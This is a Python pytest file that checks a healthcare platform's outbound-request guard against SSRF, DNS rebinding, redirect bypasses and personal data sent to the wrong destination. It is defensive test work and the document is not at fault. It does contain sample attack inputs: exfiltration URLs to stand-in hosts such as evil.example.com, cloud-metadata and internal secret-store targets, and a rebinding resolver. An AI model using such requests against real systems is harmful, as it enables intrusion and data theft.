"""INT-018 — the bypass lane: everything that gets *past* a hostname allow-list.

`tests/security/test_egress_policy.py` pins the policy shape (default deny,
glob discipline, the PHI double-gate, the vendor-LLM pin, the no-payload log).
This file exists because that shape, on its own, is not the control CLAUDE.md
invariant 19 claims it is. An allow-list that only compares the first hostname
it is handed is bypassed four ways, and files/10 §4 names all four:

    "the proxy denies literal IPs and private / link-local / metadata ranges,
     **resolves once and pins, re-validating on connect** (DNS rebinding), and
     disables redirects"

and files/10 §9 invariant 46 (`connector_endpoint_allowlist_guard`) restates
them as the acceptance for the guard: "literal IPs, private / link-local /
metadata ranges and redirects rejected; **DNS-rebinding test fails closed**".

So the four negatives pinned here are:

1. **IP literal** — a URL whose host is an address, including the cloud
   metadata endpoint. (Also covered at config level in test_egress_policy.py;
   here it is proved through the transport, which is where it would happen.)
2. **DNS answer inside a denied range** — the host *spelling* is allow-listed
   but it resolves to loopback/private/link-local/metadata. The hostname check
   passes and the request must still be refused.
3. **DNS rebinding** — resolution is not re-run before connect: the request
   that reaches the socket carries the *pinned* address from the single
   authorised lookup, with SNI and Host still naming the hostname, so a second
   answer cannot move the destination.
4. **Redirect** — a 302 to a host that is not on the list is refused on the
   hop, and redirects are off by default anyway.

Plus the fifth, which is not a network trick but a data one:

5. **Right host, wrong purpose** — personal data addressed to a destination
   that is allow-listed for something else. `pypi.org` is reachable; a PHI
   payload bound for `pypi.org` is not, and neither is a `model_weights`
   request to the row that exists for `package_registry`.

Every exchange runs over ``httpx.MockTransport`` with an injected resolver:
nothing here opens a socket or performs a DNS lookup (CLAUDE.md — never call
paid/live APIs in tests or CI; a resolver call in CI is a network call).
"""

from __future__ import annotations

import logging
import socket
from collections.abc import Iterator
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

import httpx
import pytest
from intake_platform.egress import (
    AllowlistEntry,
    DataClass,
    EgressContext,
    EgressDenied,
    EgressPolicy,
    EgressPurpose,
    InMemoryTransferLog,
    TransferRecord,
    default_resolver,
    guarded_client,
    guarded_transport,
    load_allowlist,
)
from prometheus_client import REGISTRY

REPO = Path(__file__).resolve().parents[2]
ALLOWLIST_PATH = REPO / "infra" / "security" / "egress-allowlist.yaml"

#: A routable public address used as the pretend DNS answer. TEST-NET-3
#: (RFC 5737 203.0.113.0/24) is reserved for documentation and is *not* in any
#: range the policy denies, which is exactly what makes it a usable stand-in
#: for "a normal public answer" without naming a real host's real address.
PUBLIC_ANSWER = "203.0.113.10"
PUBLIC_ANSWER_V6 = "2001:db8::10"


def _resolver(table: dict[str, list[str]]) -> Any:
    """A resolver over a fixed table — the tests never touch DNS."""

    def resolve(host: str, port: int) -> tuple[str, ...]:
        try:
            return tuple(table[host])
        except KeyError:  # pragma: no cover - a test asking for an unmapped host is a bug
            raise AssertionError(f"test resolver has no answer for {host!r}") from None

    return resolve


def _sequence_resolver(table: dict[str, list[list[str]]]) -> Any:
    """A resolver that answers differently on each call — the rebind attacker."""
    iterators: dict[str, Iterator[list[str]]] = {k: iter(v) for k, v in table.items()}

    def resolve(host: str, port: int) -> tuple[str, ...]:
        return tuple(next(iterators[host]))

    return resolve


def _policy(resolver: Any, tier: str = "dev") -> EgressPolicy:
    return EgressPolicy.for_tier(load_allowlist(ALLOWLIST_PATH), tier, resolver=resolver)  # type: ignore[arg-type]


PACKAGES = EgressContext(purpose=EgressPurpose.PACKAGE_REGISTRY, data_class=DataClass.NON_PERSONAL)


def _ok(request: httpx.Request) -> httpx.Response:
    return httpx.Response(200, json={"ok": True})


def _counter() -> float:
    value = REGISTRY.get_sample_value("sec_egress_denied_total")
    return 0.0 if value is None else value


# --- 1. IP literals, through the transport ----------------------------------------


@pytest.mark.parametrize(
    "url",
    [
        "https://169.254.169.254/latest/meta-data/",  # cloud metadata
        "https://127.0.0.1/",
        "https://10.1.2.3/",
        "https://[2001:db8::1]/",
    ],
)
def test_ip_literal_url_is_refused_before_any_lookup(url: str) -> None:
    policy = _policy(_resolver({}))  # an empty table: a lookup would raise
    transport = guarded_transport(policy, PACKAGES, inner=httpx.MockTransport(_ok))
    with httpx.Client(transport=transport) as client, pytest.raises(EgressDenied):
        client.get(url)


# --- 2. an allow-listed spelling that resolves into a denied range ------------------


@pytest.mark.parametrize(
    "answer",
    [
        "169.254.169.254",  # metadata endpoint (link-local)
        "127.0.0.1",  # loopback
        "10.0.0.7",  # RFC 1918
        "192.168.1.4",  # RFC 1918
        "172.20.0.9",  # RFC 1918
        "100.64.0.1",  # CGNAT / shared address space
        "0.0.0.0",  # noqa: S104 - the address under test, not a bind address
        "::1",  # loopback v6
        "fd00::1",  # unique-local v6
        "fe80::1",  # link-local v6
    ],
)
def test_allowlisted_host_resolving_into_a_denied_range_is_refused(answer: str) -> None:
    """The hostname check passes and the request must still fail closed.

    This is the SSRF shape files/10 §4 describes: the spelling is on the list,
    the answer is inside our own network or the metadata service.
    """
    policy = _policy(_resolver({"pypi.org": [answer]}))
    transport = guarded_transport(policy, PACKAGES, inner=httpx.MockTransport(_ok))
    with httpx.Client(transport=transport) as client:
        with pytest.raises(EgressDenied) as excinfo:
            client.get("https://pypi.org/simple/")
    assert "resolve" in str(excinfo.value).lower()


def test_a_split_answer_fails_closed_on_the_denied_member() -> None:
    """One public answer plus one private answer is refused, not load-balanced.

    Taking the good address and discarding the bad one would make the attack a
    matter of retry timing. A mixed answer is itself the signature.
    """
    policy = _policy(_resolver({"pypi.org": [PUBLIC_ANSWER, "169.254.169.254"]}))
    transport = guarded_transport(policy, PACKAGES, inner=httpx.MockTransport(_ok))
    with httpx.Client(transport=transport) as client, pytest.raises(EgressDenied):
        client.get("https://pypi.org/simple/")


def test_an_empty_answer_is_a_denial_not_a_pass() -> None:
    policy = _policy(_resolver({"pypi.org": []}))
    transport = guarded_transport(policy, PACKAGES, inner=httpx.MockTransport(_ok))
    with httpx.Client(transport=transport) as client, pytest.raises(EgressDenied):
        client.get("https://pypi.org/simple/")


@pytest.mark.parametrize(
    "url",
    [
        "http://openbao:8200/v1/sys/seal-status",  # files/10 §4 names this one
        "https://unleash/api/admin/features",
        "http://postgres:5432/",
        "https://minio:9000/",
    ],
)
def test_a_single_label_service_name_inside_our_own_network_is_refused(url: str) -> None:
    """The console SSRF files/10 §4 describes, in its most useful form.

    `http://openbao:8200` is not an exotic payload — it is the shortest string
    that reaches the secret store from inside the network, and it is never on
    an allow-list of *vendors*, so default deny is what refuses it. Pinned
    because "obviously denied" is how a control acquires an exception.
    """
    policy = _policy(_resolver({}))
    transport = guarded_transport(policy, PACKAGES, inner=httpx.MockTransport(_ok))
    with httpx.Client(transport=transport) as client, pytest.raises(EgressDenied):
        client.get(url)


def test_a_host_that_is_not_allow_listed_is_never_resolved() -> None:
    """Order matters: policy first, DNS second.

    Resolving before checking would turn every refused destination into a DNS
    query carrying the attacker's chosen name to a resolver we do not own —
    a working exfiltration channel out of a request we correctly denied.
    """
    seen: list[str] = []

    def resolve(host: str, port: int) -> tuple[str, ...]:
        seen.append(host)
        return (PUBLIC_ANSWER,)

    policy = _policy(resolve)
    transport = guarded_transport(policy, PACKAGES, inner=httpx.MockTransport(_ok))
    with httpx.Client(transport=transport) as client, pytest.raises(EgressDenied):
        client.get("https://tc-12345678901.attacker.example/")
    assert seen == []


# --- 3. DNS rebinding: resolve once, pin, connect to the pin ------------------------


def test_the_connection_goes_to_the_pinned_address_with_the_hostname_intact() -> None:
    """The socket target is the address we authorised; TLS still names the host.

    ``sni_hostname`` is the httpcore extension that decides both SNI and the
    certificate's expected name, so pinning the address does not weaken
    verification — it removes the second lookup that verification cannot see.
    """
    seen: list[httpx.Request] = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return httpx.Response(200)

    policy = _policy(_resolver({"pypi.org": [PUBLIC_ANSWER]}))
    transport = guarded_transport(policy, PACKAGES, inner=httpx.MockTransport(handler))
    with httpx.Client(transport=transport) as client:
        assert client.get("https://pypi.org/simple/").status_code == 200

    assert len(seen) == 1
    sent = seen[0]
    assert sent.url.host == PUBLIC_ANSWER, "the socket must target the pinned address"
    assert sent.headers["Host"] == "pypi.org"
    assert sent.extensions["sni_hostname"] == "pypi.org"
    assert sent.url.path == "/simple/", "pinning must not rewrite the request itself"


def test_ipv6_answers_are_pinned_as_bracketed_url_hosts() -> None:
    seen: list[httpx.Request] = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return httpx.Response(200)

    policy = _policy(_resolver({"pypi.org": [PUBLIC_ANSWER_V6]}))
    transport = guarded_transport(policy, PACKAGES, inner=httpx.MockTransport(handler))
    with httpx.Client(transport=transport) as client:
        client.get("https://pypi.org/simple/")

    assert seen[0].url.host == PUBLIC_ANSWER_V6
    assert seen[0].headers["Host"] == "pypi.org"


def test_rebinding_cannot_move_the_destination_between_check_and_connect() -> None:
    """The classic TOCTOU: answer public, then answer metadata.

    A second lookup never happens, so the second answer is never used. Proved
    by the address the transport actually connected to — and by the resolver
    having been called exactly once.
    """
    calls: list[str] = []
    answers = _sequence_resolver({"pypi.org": [[PUBLIC_ANSWER], ["169.254.169.254"]]})

    def resolve(host: str, port: int) -> tuple[str, ...]:
        calls.append(host)
        return answers(host, port)  # type: ignore[no-any-return]

    seen: list[httpx.Request] = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return httpx.Response(200)

    policy = _policy(resolve)
    transport = guarded_transport(policy, PACKAGES, inner=httpx.MockTransport(handler))
    with httpx.Client(transport=transport) as client:
        client.get("https://pypi.org/simple/")

    assert calls == ["pypi.org"], "one authorised lookup per request, never two"
    assert seen[0].url.host == PUBLIC_ANSWER


def test_each_request_is_authorised_and_pinned_independently() -> None:
    """A pin is per request, never a cache that outlives its authorisation.

    Second request, poisoned answer: it must be refused rather than ride the
    first request's pin.
    """
    answers = _sequence_resolver({"pypi.org": [[PUBLIC_ANSWER], ["10.0.0.9"]]})
    policy = _policy(answers)
    transport = guarded_transport(policy, PACKAGES, inner=httpx.MockTransport(_ok))
    with httpx.Client(transport=transport) as client:
        client.get("https://pypi.org/simple/")
        with pytest.raises(EgressDenied):
            client.get("https://pypi.org/simple/")


# --- 4. redirects -------------------------------------------------------------------


def _redirector(location: str) -> Any:
    def handler(request: httpx.Request) -> httpx.Response:
        if request.headers.get("Host") == "pypi.org":
            return httpx.Response(302, headers={"Location": location})
        return httpx.Response(200)

    return handler


def test_a_redirect_to_an_unlisted_host_is_refused_on_the_hop() -> None:
    """Even a caller who opts into following redirects cannot leave the list.

    This is the hole worth naming: the allow-list saw `pypi.org`, said yes, and
    the bytes were going to `evil.example.com`. Every hop re-enters the guard.
    """
    policy = _policy(
        _resolver({"pypi.org": [PUBLIC_ANSWER], "evil.example.com": [PUBLIC_ANSWER]}),
    )
    transport = guarded_transport(
        policy, PACKAGES, inner=httpx.MockTransport(_redirector("https://evil.example.com/exfil"))
    )
    with httpx.Client(transport=transport, follow_redirects=True) as client:
        with pytest.raises(EgressDenied) as excinfo:
            client.get("https://pypi.org/simple/")
    assert "evil.example.com" in str(excinfo.value)


def test_a_redirect_to_a_denied_ip_literal_is_refused_on_the_hop() -> None:
    policy = _policy(_resolver({"pypi.org": [PUBLIC_ANSWER]}))
    transport = guarded_transport(
        policy,
        PACKAGES,
        inner=httpx.MockTransport(_redirector("https://169.254.169.254/latest/meta-data/")),
    )
    with httpx.Client(transport=transport, follow_redirects=True) as client:
        with pytest.raises(EgressDenied):
            client.get("https://pypi.org/simple/")


def test_a_relative_redirect_resolves_against_the_hostname_not_the_pin() -> None:
    """Pinning must not corrupt the caller's view of where it has been.

    If the pinned address leaked back into the client's request object, a
    relative `Location` would resolve against `https://203.0.113.10/...` and
    the next hop would be checked as an IP literal — a denial for the wrong
    reason, and a broken client.
    """
    policy = _policy(_resolver({"pypi.org": [PUBLIC_ANSWER]}))
    seen: list[str] = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(str(request.headers["Host"]) + request.url.path)
        if request.url.path == "/simple/":
            return httpx.Response(302, headers={"Location": "/simple/moved/"})
        return httpx.Response(200)

    transport = guarded_transport(policy, PACKAGES, inner=httpx.MockTransport(handler))
    with httpx.Client(transport=transport, follow_redirects=True) as client:
        assert client.get("https://pypi.org/simple/").status_code == 200
    assert seen == ["pypi.org/simple/", "pypi.org/simple/moved/"]


def test_guarded_client_does_not_follow_redirects_by_default() -> None:
    """files/10 §4: the proxy "disables redirects". The client agrees."""
    policy = _policy(_resolver({"pypi.org": [PUBLIC_ANSWER]}))
    with guarded_client(
        policy,
        PACKAGES,
        inner=httpx.MockTransport(_redirector("https://pypi.org/other/")),
    ) as client:
        assert client.follow_redirects is False
        assert client.get("https://pypi.org/simple/").status_code == 302


# --- 5. right host, wrong purpose / wrong data class --------------------------------


def test_personal_data_bound_for_a_non_personal_destination_is_refused() -> None:
    """`pypi.org` is reachable. A patient is not allowed to travel there.

    The destination is on the list, the port is right, the purpose even
    matches — and the request still fails, because the row is `phi_allowed:
    false` and the caller declared PHI.
    """
    policy = _policy(_resolver({"pypi.org": [PUBLIC_ANSWER]}))
    context = EgressContext(purpose=EgressPurpose.PACKAGE_REGISTRY, data_class=DataClass.PHI)
    decision = policy.check("pypi.org", 443, context)
    assert not decision.allowed
    assert "personal data" in decision.reason


def test_pseudonymous_data_is_personal_data_and_is_refused_too() -> None:
    """KVKK treats pseudonymised data as personal data; so does this gate."""
    policy = _policy(_resolver({"pypi.org": [PUBLIC_ANSWER]}))
    context = EgressContext(
        purpose=EgressPurpose.PACKAGE_REGISTRY, data_class=DataClass.PSEUDONYMOUS
    )
    assert not policy.check("pypi.org", 443, context).allowed


def test_a_purpose_the_row_does_not_serve_is_refused() -> None:
    """Near-miss control: same host, same data class, wrong declared purpose."""
    policy = _policy(_resolver({"pypi.org": [PUBLIC_ANSWER]}))
    wrong = EgressContext(purpose=EgressPurpose.MODEL_WEIGHTS, data_class=DataClass.NON_PERSONAL)
    decision = policy.check("pypi.org", 443, wrong)
    assert not decision.allowed
    assert "purpose" in decision.reason
    # ... and the same host with the purpose it exists for is allowed, so the
    # test above fails for the purpose and not for something incidental.
    assert policy.check("pypi.org", 443, PACKAGES).allowed


def test_the_transport_refuses_a_wrong_purpose_before_resolving() -> None:
    policy = _policy(_resolver({}))
    wrong = EgressContext(purpose=EgressPurpose.MODEL_WEIGHTS, data_class=DataClass.PHI)
    transport = guarded_transport(policy, wrong, inner=httpx.MockTransport(_ok))
    with httpx.Client(transport=transport) as client, pytest.raises(EgressDenied):
        client.get("https://pypi.org/simple/")


#: Purposes whose destinations are NOT vendor rows and therefore never appear
#: in this file (INT-160 / ADR-026): a hospital push endpoint is per-tenant
#: data, registered out-of-band and bound to a signed DPA (files/10 inv. 46),
#: so it is declared by `infra/connectors/destinations.yaml` and the
#: `ConnectorDestination` schema instead. INT-161 / ADR-027 adds the second
#: one for the same reason: a SMART token endpoint is the same per-tenant
#: registry data, and putting it here would make one hospital's authorization
#: server reachable by every process and every tenant. Naming the exemption
#: here rather than dropping the assertion keeps the "no dead members" rule
#: intact, and the test below adds the direction that matters more: such a
#: purpose must be ABSENT from this file, never merely optional in it.
NON_VENDOR_PURPOSES = frozenset(
    {
        EgressPurpose.CLINICAL_RECORD_PUSH,
        EgressPurpose.CONNECTOR_AUTHORIZATION,
        EgressPurpose.CLINICAL_RECORD_READ,
    }
)

#: INT-329. A VENDOR purpose whose row is a decision nobody has made yet. The
#: SMS processor receives the patient's phone number — personal data, sent to a
#: processor abroad — so its row needs the owner's DPA and cross-border
#: decision, and on the PHI tier a ``phi_exception_approval`` naming that
#: decision (docs/evidence/INT-329.md). The member exists because the OTP
#: adapter must declare why it calls; the row does not, so the shipped policy
#: refuses every such call. This set only shrinks: the test after next fails the
#: moment a row declaring one of these purposes lands, so the row and the
#: purpose's removal from here arrive in the same change.
#: INT-428 / ADR-035 adds the hosted model lanes' purpose. The owner decided
#: the lane (2 Oct 2026); its row lives in this hook-protected file, which only
#: a human changes (07 §F rule 2), so until that row lands every hosted lane is
#: refused here as well as by the router (`hosted_egress_not_listed`). The row
#: and this purpose's removal from the set arrive in the same change.
PURPOSES_AWAITING_THE_OWNER = frozenset(
    {EgressPurpose.SMS_OTP_DELIVERY, EgressPurpose.HOSTED_MODEL_INFERENCE}
)


def _shipped_rows() -> list[AllowlistEntry]:
    allowlist = load_allowlist(ALLOWLIST_PATH)
    return [*allowlist.tiers.dev, *allowlist.tiers.phi_path]


def test_every_purpose_in_the_vocabulary_is_used_by_the_shipped_allowlist() -> None:
    """A closed vocabulary with dead members drifts into a free-text field.

    Every `EgressPurpose` must be declared by a shipped policy artefact, and
    every shipped row's purpose must be in the enum (the latter by type).
    """
    used = {entry.purpose_id for entry in _shipped_rows()}
    expected = set(EgressPurpose) - NON_VENDOR_PURPOSES - PURPOSES_AWAITING_THE_OWNER
    assert used == expected, (
        f"unused purposes: {sorted(expected - used)}; "
        "a purpose nothing declares is vocabulary, not policy"
    )


def test_a_connector_push_purpose_never_appears_in_the_vendor_allowlist() -> None:
    """The stronger direction of the exemption above.

    A clinical-record push destination is one hospital's endpoint under one
    tenant's DPA. Putting it in this file would make it reachable by every
    process that loads the vendor list, for every tenant — which is ADR-025's
    fifth bypass ("the right host addressed for the wrong reason") installed
    as configuration rather than exploited.
    """
    offenders = [entry.name for entry in _shipped_rows() if entry.purpose_id in NON_VENDOR_PURPOSES]
    assert offenders == [], (
        f"{offenders} declare a non-vendor purpose in the vendor allow-list; "
        "connector destinations belong in infra/connectors/destinations.yaml"
    )


def test_a_purpose_awaiting_the_owner_has_no_row_and_every_tier_refuses_it() -> None:
    """The stronger direction of the pending set above (INT-329).

    No shipped row may declare a pending purpose — a row that lands must take
    its purpose out of ``PURPOSES_AWAITING_THE_OWNER`` in the same change — and
    until then the shipped policy refuses the SMS vendor on every tier, for
    every data class, which is what keeps the OTP tier at 503 outside dev.
    """
    offenders = [
        entry.name for entry in _shipped_rows() if entry.purpose_id in PURPOSES_AWAITING_THE_OWNER
    ]
    assert offenders == [], (
        f"{offenders} declare a purpose still awaiting the owner; record the decision "
        "and remove the purpose from PURPOSES_AWAITING_THE_OWNER in the same change"
    )
    allowlist = load_allowlist(ALLOWLIST_PATH)
    for tier in ("dev", "phi_path"):
        policy = EgressPolicy.for_tier(allowlist, tier, resolver=_resolver({}))  # type: ignore[arg-type]
        for purpose in PURPOSES_AWAITING_THE_OWNER:
            for data_class in DataClass:
                context = EgressContext(purpose=purpose, data_class=data_class)
                assert not policy.check("api.twilio.com", 443, context).allowed


# --- the transfer log: {host, purpose, bytes, ts} -----------------------------------


def test_every_decision_writes_one_transfer_record_with_the_acceptance_fields() -> None:
    """ "every egress logged {host,purpose,bytes,ts} feeding the vendor-transfer
    register" — the record is that feed, for allows and denials alike."""
    policy = _policy(
        _resolver({"pypi.org": [PUBLIC_ANSWER], "files.pythonhosted.org": [PUBLIC_ANSWER]})
    )
    log = InMemoryTransferLog()
    transport = guarded_transport(
        policy, PACKAGES, inner=httpx.MockTransport(_ok), transfer_log=log
    )
    before = datetime.now(UTC)
    with httpx.Client(transport=transport) as client:
        client.post("https://pypi.org/simple/", content=b"0123456789")
        with pytest.raises(EgressDenied):
            client.get("https://evil.example.com/exfil")
    after = datetime.now(UTC)

    assert len(log.entries) == 2
    allowed, denied = log.entries
    assert (allowed.host, allowed.port) == ("pypi.org", 443)
    assert allowed.purpose is EgressPurpose.PACKAGE_REGISTRY
    assert allowed.data_class is DataClass.NON_PERSONAL
    assert allowed.bytes_out == 10
    assert allowed.decision == "allow"
    assert before <= allowed.ts <= after
    assert allowed.ts.tzinfo is UTC

    assert denied.host == "evil.example.com"
    assert denied.decision == "deny"
    assert denied.bytes_out == 0, "a refused request transferred nothing"


def test_transfer_records_have_no_field_a_payload_could_occupy() -> None:
    """Invariant 6, enforced by the field set rather than by a filter.

    The record is a frozen dataclass with a closed field list, so there is no
    key a URL, a query string or a body could be written into even by mistake.
    """
    fields = set(TransferRecord.__dataclass_fields__)
    assert fields == {
        "ts",
        "host",
        "port",
        "purpose",
        "data_class",
        "bytes_out",
        "decision",
        "reason",
        "tier",
    }
    for forbidden in ("url", "path", "query", "body", "content", "payload", "headers"):
        assert forbidden not in fields


def test_a_denial_increments_sec_egress_denied_total(caplog: pytest.LogCaptureFixture) -> None:
    """files/10 §5: egress denials are a hard alert, so they need a series.

    `sec.egress_denied_total` is in observability/metrics_catalog.yaml with
    `target: "0 (any increase pages)"`.
    """
    policy = _policy(_resolver({}))
    transport = guarded_transport(policy, PACKAGES, inner=httpx.MockTransport(_ok))
    before = _counter()
    with caplog.at_level(logging.WARNING, logger="intake_platform.egress"):
        with httpx.Client(transport=transport) as client, pytest.raises(EgressDenied):
            client.get("https://evil.example.com/exfil")
    assert _counter() == before + 1
    assert [r for r in caplog.records if r.getMessage() == "sec.egress_denied"]


def test_a_resolution_denial_also_increments_the_counter() -> None:
    """Every refusal is one refusal, whichever layer caught it."""
    policy = _policy(_resolver({"pypi.org": ["169.254.169.254"]}))
    transport = guarded_transport(policy, PACKAGES, inner=httpx.MockTransport(_ok))
    before = _counter()
    with httpx.Client(transport=transport) as client, pytest.raises(EgressDenied):
        client.get("https://pypi.org/simple/")
    assert _counter() == before + 1


# --- the public surface the transport is built on -----------------------------------


def test_authorize_returns_the_pin_for_an_allowed_host_and_none_for_a_denial() -> None:
    policy = _policy(_resolver({"pypi.org": [PUBLIC_ANSWER]}))
    ok = policy.authorize("pypi.org", 443, PACKAGES)
    assert ok.allowed
    assert ok.pin is not None
    assert ok.pin.address == PUBLIC_ANSWER
    assert ok.pin.addresses == (PUBLIC_ANSWER,)
    assert ok.pin.host == "pypi.org"
    assert policy.tier == "dev"

    refused = policy.authorize("evil.example.com", 443, PACKAGES)
    assert not refused.allowed
    assert refused.pin is None


def test_duplicate_answers_collapse_to_one_pin() -> None:
    policy = _policy(_resolver({"pypi.org": [PUBLIC_ANSWER, PUBLIC_ANSWER]}))
    pin = policy.authorize("pypi.org", 443, PACKAGES).pin
    assert pin is not None
    assert pin.addresses == (PUBLIC_ANSWER,)


def test_a_resolver_answer_that_is_not_an_address_is_refused() -> None:
    """Defensive, and cheap: a resolver returning a name would otherwise be
    handed straight to the socket layer as the pin."""
    policy = _policy(_resolver({"pypi.org": ["pypi.org.attacker.example"]}))
    assert not policy.authorize("pypi.org", 443, PACKAGES).allowed


def test_the_default_resolver_asks_getaddrinfo_once_and_returns_addresses(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The production resolver, without a lookup: ``socket.getaddrinfo`` is
    replaced, so CI performs no DNS query (which is a network call)."""
    calls: list[tuple[str, int]] = []

    def fake_getaddrinfo(host: str, port: int, **kwargs: Any) -> list[Any]:
        calls.append((host, port))
        return [
            (2, 1, 6, "", (PUBLIC_ANSWER, port)),
            (2, 1, 6, "", (PUBLIC_ANSWER, port)),  # duplicate: collapses
            (30, 1, 6, "", (PUBLIC_ANSWER_V6, port, 0, 0)),
        ]

    monkeypatch.setattr(socket, "getaddrinfo", fake_getaddrinfo)
    assert default_resolver("pypi.org", 443) == (PUBLIC_ANSWER, PUBLIC_ANSWER_V6)
    assert calls == [("pypi.org", 443)]


def test_the_default_resolver_turns_a_lookup_failure_into_a_denial(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def boom(host: str, port: int, **kwargs: Any) -> list[Any]:
        raise OSError("no such host")

    monkeypatch.setattr(socket, "getaddrinfo", boom)
    with pytest.raises(EgressDenied):
        default_resolver("pypi.org", 443)


def test_the_default_transport_and_client_are_built_without_a_socket() -> None:
    """Constructing the real transport must not connect to anything.

    Also the only place `guarded_transport`/`guarded_client` run with their
    production inner transport, which is where a wiring mistake would hide.
    """
    policy = _policy(_resolver({}))
    transport = guarded_transport(policy, PACKAGES)
    transport.close()
    with guarded_client(policy, PACKAGES, follow_redirects=True) as client:
        assert client.follow_redirects is True


# --- composing with the forward proxy ------------------------------------------------


def test_behind_the_proxy_the_hostname_survives_to_the_connect_line() -> None:
    """The two enforcement points must compose, not fight.

    Squid matches the CONNECT line's hostname against `vendor_exact` /
    `vendor_glob`; an IP literal matches neither and would be refused. So with
    a proxy configured the request keeps its hostname and the proxy does the
    resolve-and-pin files/10 §4 assigns it — while the allow-list, purpose and
    data-class checks still run in process.
    """
    seen: list[httpx.Request] = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return httpx.Response(200)

    resolved: list[str] = []

    def resolver(host: str, port: int) -> tuple[str, ...]:
        resolved.append(host)
        return (PUBLIC_ANSWER,)

    policy = _policy(resolver)
    transport = guarded_transport(
        policy,
        PACKAGES,
        inner=httpx.MockTransport(handler),
        proxy="http://egress-proxy:3128",
    )
    with httpx.Client(transport=transport) as client:
        assert client.get("https://pypi.org/simple/").status_code == 200

    assert seen[0].url.host == "pypi.org"
    assert "sni_hostname" not in seen[0].extensions
    assert resolved == [], "the proxy tier owns resolution when there is a proxy"


def test_the_allow_list_still_refuses_behind_the_proxy() -> None:
    """Delegating the pin does not delegate the allow-list."""
    policy = _policy(_resolver({}))
    transport = guarded_transport(
        policy,
        PACKAGES,
        inner=httpx.MockTransport(_ok),
        proxy="http://egress-proxy:3128",
    )
    with httpx.Client(transport=transport) as client, pytest.raises(EgressDenied):
        client.get("https://evil.example.com/exfil")


def test_a_wrong_purpose_is_still_refused_behind_the_proxy() -> None:
    """Delegating the pin does not delegate the purpose check either."""
    policy = _policy(_resolver({}))
    wrong = EgressContext(purpose=EgressPurpose.MODEL_WEIGHTS, data_class=DataClass.NON_PERSONAL)
    transport = guarded_transport(
        policy,
        wrong,
        inner=httpx.MockTransport(_ok),
        proxy="http://egress-proxy:3128",
    )
    with httpx.Client(transport=transport) as client, pytest.raises(EgressDenied):
        client.get("https://pypi.org/simple/")


def test_a_personal_data_transport_may_not_delegate_its_pin_at_all() -> None:
    """INT-203. This case used to be reachable and refused later, on the
    purpose; it is now refused at construction, which is strictly earlier.

    The reason is that the proxy path is the one configuration in which
    NEITHER enforcement point resolves: the process passes the hostname
    through so the CONNECT line carries it, and the proxy's allow-list has no
    connector rows and an empty PHI tier. A PHI call configured that way loses
    the in-process pin and gains nothing — the fourth shape of the bypass
    ADR-025 catalogued, and the one that looks like configuration rather than
    like a change to a security boundary.
    """
    policy = _policy(_resolver({}))
    for data_class in (DataClass.PHI, DataClass.PSEUDONYMOUS):
        with pytest.raises(ValueError, match="delegate its pin"):
            guarded_transport(
                policy,
                EgressContext(purpose=EgressPurpose.MODEL_WEIGHTS, data_class=data_class),
                inner=httpx.MockTransport(_ok),
                proxy="http://egress-proxy:3128",
            )


def test_the_denial_message_carries_no_path_or_query() -> None:
    policy = _policy(_resolver({}))
    log = InMemoryTransferLog()
    transport = guarded_transport(
        policy, PACKAGES, inner=httpx.MockTransport(_ok), transfer_log=log
    )
    with httpx.Client(transport=transport) as client:
        with pytest.raises(EgressDenied) as excinfo:
            client.get("https://evil.example.com/gizli-yol?tck=12345678901")
    message = str(excinfo.value)
    assert "gizli-yol" not in message
    assert "12345678901" not in message
    assert "gizli-yol" not in log.entries[0].reason
